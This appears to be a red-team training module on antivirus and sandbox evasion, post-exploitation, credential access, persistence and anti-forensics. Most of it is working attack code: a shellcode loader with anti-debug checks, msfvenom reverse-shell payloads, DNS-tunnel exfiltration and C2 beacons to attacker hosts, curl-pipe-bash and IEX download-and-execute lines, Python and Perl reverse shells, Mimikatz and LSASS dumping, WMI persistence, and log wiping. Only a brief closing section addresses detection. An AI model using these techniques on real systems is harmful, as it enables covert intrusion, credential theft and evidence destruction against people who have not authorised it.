# Fundamentals of Evasion and Post Exploitation Techniques

## Introduction

After gaining initial access to a system, the real work begins. Post-exploitation involves maintaining access, gathering information, and achieving objectives while evading detection. This module covers techniques for staying hidden and maximizing the value of compromised systems.

## Post-Exploitation Overview

### Objectives

1. **Maintain Access**: Establish persistence mechanisms
2. **Gather Intelligence**: Collect valuable information
3. **Lateral Movement**: Expand access to other systems
4. **Privilege Escalation**: Gain higher-level permissions
5. **Data Exfiltration**: Extract target information
6. **Cover Tracks**: Remove evidence of compromise

### The Kill Chain

```
Initial Access → Execution → Persistence → Privilege Escalation
     ↓              ↓            ↓                ↓
Defense Evasion ← Credential Access ← Discovery ← Lateral Movement
     ↓
Collection → Exfiltration → Impact
```

## Evasion Techniques

### 1. Antivirus Evasion

#### Obfuscation

```python
# Simple XOR encoding
def xor_encode(data, key):
    return bytes([b ^ key for b in data])

# Encode shellcode
shellcode = b"\x31\xc0\x50\x68..."
key = 0x42
encoded = xor_encode(shellcode, key)

# Decoder stub
decoder = f"""
unsigned char encoded[] = {{{','.join(f'0x{b:02x}' for b in encoded)}}};
unsigned char decoded[{len(encoded)}];
for(int i=0; i<{len(encoded)}; i++) {{
    decoded[i] = encoded[i] ^ 0x{key:02x};
}}
((void(*)())decoded)();
"""
```

#### Encryption

```python
# AES encryption for payload
from Crypto.Cipher import AES
import base64

def encrypt_payload(payload, key):
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(payload)
    return cipher.nonce + tag + ciphertext

# Encrypted payload
encrypted = encrypt_payload(shellcode, b'sixteen byte key')
```

#### Polymorphism

```python
# Generate unique payloads each time
def generate_polymorphic_payload():
    # Random NOP sled
    nops = bytes([random.choice([0x90, 0x91, 0x92]) 
                  for _ in range(random.randint(50, 100))])
    
    # Random garbage instructions
    garbage = generate_random_instructions()
    
    # Actual payload
    payload = nops + garbage + actual_shellcode
    
    return payload
```

#### Packing

```bash
# UPX packer
upx --best payload.exe

# Custom packer
# Compress + encrypt + custom loader
```

### 2. Signature Evasion

**Msfvenom Encoding**

```bash
# Single encoding
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai \
  -f exe -o payload.exe

# Multiple iterations
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 \
  -f exe -o payload.exe

# Multiple encoders
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -e x86/countdown -i 5 \
  -f exe -o payload.exe
```

**Custom Payload Development**

```c
// Custom C payload with evasion
#include <windows.h>
#include <stdio.h>

// Encrypted shellcode
unsigned char enc_shellcode[] = {0x52, 0x31, 0x90, ...};

// XOR decoder
void decode(unsigned char *data, int len, unsigned char key) {
    for(int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

int main() {
    // Anti-debugging checks
    if(IsDebuggerPresent()) return 0;
    
    // Sleep to evade sandboxes
    Sleep(60000);
    
    // Decode shellcode
    decode(enc_shellcode, sizeof(enc_shellcode), 0x42);
    
    // Allocate memory
    void *exec = VirtualAlloc(0, sizeof(enc_shellcode), 
                              MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    // Copy and execute
    memcpy(exec, enc_shellcode, sizeof(enc_shellcode));
    ((void(*)())exec)();
    
    return 0;
}
```

### 3. Behavioral Evasion

#### Sandbox Detection

```python
# Check for sandbox indicators
def is_sandbox():
    checks = []
    
    # Check CPU cores (sandboxes often have few cores)
    if psutil.cpu_count() < 2:
        checks.append(True)
    
    # Check RAM (sandboxes often have limited RAM)
    if psutil.virtual_memory().total < 4 * 1024**3:  # 4GB
        checks.append(True)
    
    # Check for VM artifacts
    vm_files = [
        'C:\\windows\\System32\\Drivers\\Vmmouse.sys',
        'C:\\windows\\System32\\Drivers\\vmhgfs.sys'
    ]
    if any(os.path.exists(f) for f in vm_files):
        checks.append(True)
    
    # Check for analysis tools
    analysis_processes = ['wireshark', 'procmon', 'ollydbg']
    running = [p.name().lower() for p in psutil.process_iter()]
    if any(proc in running for proc in analysis_processes):
        checks.append(True)
    
    return len(checks) > 2  # Multiple indicators = likely sandbox
```

#### Time-Based Evasion

```python
# Sleep to evade automated analysis
import time
import random

# Random sleep
time.sleep(random.randint(300, 600))  # 5-10 minutes

# Check if sleep was skipped (sandbox acceleration)
start = time.time()
time.sleep(60)
if time.time() - start < 59:
    # Sleep was accelerated, likely sandbox
    exit()
```

#### User Interaction

```python
# Require user interaction before executing
import tkinter as tk

def wait_for_interaction():
    root = tk.Tk()
    root.title("Update Required")
    
    def on_click():
        root.destroy()
        execute_payload()
    
    button = tk.Button(root, text="Install Update", command=on_click)
    button.pack()
    root.mainloop()
```

### 4. Network Evasion

#### Domain Fronting

```python
# Use CDN to hide C2 communication
import requests

# Actual C2 server
c2_server = "malicious-c2.com"

# CDN domain
cdn_domain = "legitimate-cdn.cloudfront.net"

# Request with domain fronting
response = requests.get(
    f"https://{cdn_domain}/beacon",
    headers={"Host": c2_server}
)
```

#### DNS Tunneling

```python
# Exfiltrate data via DNS queries
import dns.resolver

def dns_exfiltrate(data):
    # Encode data in subdomain
    encoded = base64.b64encode(data).decode()
    chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
    
    for i, chunk in enumerate(chunks):
        domain = f"{chunk}.{i}.exfil.attacker.com"
        try:
            dns.resolver.resolve(domain, 'A')
        except:
            pass
```

#### HTTPS Encryption

```python
# Encrypt C2 communication
import requests
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)

def send_encrypted(data):
    encrypted = cipher.encrypt(data.encode())
    response = requests.post(
        "https://c2-server.com/beacon",
        data=encrypted,
        verify=False  # Accept self-signed certs
    )
    return cipher.decrypt(response.content)
```

## Post-Exploitation Frameworks

### Metasploit Meterpreter

```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe

# Set up listener
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
exploit

# Meterpreter commands
meterpreter> sysinfo
meterpreter> getuid
meterpreter> ps
meterpreter> migrate <PID>
meterpreter> hashdump
meterpreter> screenshot
meterpreter> keyscan_start
meterpreter> download file.txt
meterpreter> upload tool.exe
```

### Empire/Starkiller

```bash
# PowerShell-based post-exploitation
# Features:
# - PowerShell agents
# - Built-in modules
# - Credential harvesting
# - Lateral movement
# - Privilege escalation
```

### Cobalt Strike

```bash
# Commercial red team framework
# Features:
# - Beacon payload
# - Malleable C2 profiles
# - Advanced evasion
# - Team collaboration
# - Comprehensive post-exploitation
```

### Covenant

```bash
# .NET-based C2 framework
# Features:
# - C# agents (Grunts)
# - Web-based interface
# - Task scheduling
# - Built-in evasion
```

## System Enumeration

### Windows Enumeration

```powershell
# System information
systeminfo
wmic os get caption,version,osarchitecture

# User information
whoami /all
net user
net localgroup administrators

# Network information
ipconfig /all
route print
arp -a
netstat -ano

# Running processes
tasklist /v
wmic process list full

# Installed software
wmic product get name,version

# Scheduled tasks
schtasks /query /fo LIST /v

# Services
sc query
wmic service list brief

# Shares
net share
wmic share list

# Firewall
netsh advfirewall show allprofiles
netsh firewall show state

# Antivirus
wmic /namespace:\\root\securitycenter2 path antivirusproduct

# Recent files
dir /a /s /b C:\Users\*\Recent\*
```

### Linux Enumeration

```bash
# System information
uname -a
cat /etc/*-release
lsb_release -a

# User information
id
whoami
cat /etc/passwd
cat /etc/group
sudo -l

# Network information
ifconfig -a
ip addr show
route -n
arp -a
netstat -tulpn

# Running processes
ps aux
ps -ef

# Installed software
dpkg -l  # Debian/Ubuntu
rpm -qa  # RedHat/CentOS

# Cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# Services
systemctl list-units --type=service
service --status-all

# SUID/SGID files
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
```

## Living Off The Land (LOLBins)

### Windows LOLBins

```powershell
# Download file with certutil
certutil -urlcache -split -f http://attacker.com/tool.exe tool.exe

# Download with PowerShell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"

# Execute with regsvr32
regsvr32 /s /n /u /i:http://attacker.com/script.sct scrobj.dll

# Execute with mshta
mshta http://attacker.com/payload.hta

# Execute with rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1');")

# Bypass AppLocker with InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

### Linux LOLBins

```bash
# Download with curl
curl http://attacker.com/tool.sh | bash

# Download with wget
wget -O- http://attacker.com/tool.sh | bash

# Execute with Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Execute with Perl
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Credential Access

### Windows Credentials

```powershell
# Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
lsadump::sam
lsadump::secrets

# LaZagne (multi-platform password recovery)
laZagne.exe all

# Dump LSASS
procdump.exe -ma lsass.exe lsass.dmp
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> lsass.dmp full

# Registry hives
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive
```

### Linux Credentials

```bash
# /etc/shadow (requires root)
cat /etc/shadow

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null

# Browser passwords
# Firefox: ~/.mozilla/firefox/*/logins.json
# Chrome: ~/.config/google-chrome/Default/Login Data

# History files
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history

# Configuration files
grep -r "password" /home/*/.config 2>/dev/null
grep -r "pass" /var/www/html/*.php 2>/dev/null
```

## Fileless Malware

### PowerShell-Based

```powershell
# In-memory execution
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')

# Reflective DLL injection
$bytes = (New-Object Net.WebClient).DownloadData('http://attacker.com/dll.dll')
[System.Reflection.Assembly]::Load($bytes)

# PowerShell Empire
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/empire.ps1')"
```

### WMI-Based

```powershell
# WMI event subscription for persistence
$FilterArgs = @{name='Updater'; EventNameSpace='root\CimV2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"'}
$Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{name='Updater'; CommandLineTemplate='powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/payload.ps1")'}
$Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```

## Anti-Forensics

### Log Clearing

```powershell
# Windows Event Logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Linux logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > ~/.bash_history
history -c
```

### Timestomping

```powershell
# Modify file timestamps (Windows)
powershell (Get-Item file.exe).CreationTime=("01 January 2020 12:00:00")
powershell (Get-Item file.exe).LastWriteTime=("01 January 2020 12:00:00")
powershell (Get-Item file.exe).LastAccessTime=("01 January 2020 12:00:00")

# Linux
touch -t 202001011200 file.txt
```

## Best Practices for Red Teams

1. **Stay Stealthy**: Minimize noise and detection
2. **Document Everything**: Record all actions
3. **Respect Scope**: Stay within authorized boundaries
4. **Avoid Damage**: Don't harm production systems
5. **Communicate**: Keep blue team informed as needed
6. **Clean Up**: Remove artifacts after engagement

## Detection and Blue Team Perspective

### Indicators of Compromise (IOCs)

- Unusual network connections
- Suspicious process execution
- Unauthorized privilege escalation
- Abnormal user behavior
- Modified system files
- Cleared event logs

### Detection Tools

- **SIEM**: Splunk, ELK Stack, QRadar
- **EDR**: CrowdStrike, Carbon Black, SentinelOne
- **Network Monitoring**: Zeek, Suricata, Snort
- **Threat Hunting**: YARA rules, Sigma rules

## Resources

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [GTFOBins](https://gtfobins.github.io/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Red Team Field Manual](https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504)

## Next Steps

After mastering evasion and post-exploitation, you'll learn about command and control infrastructure, data exfiltration, and privilege escalation techniques.

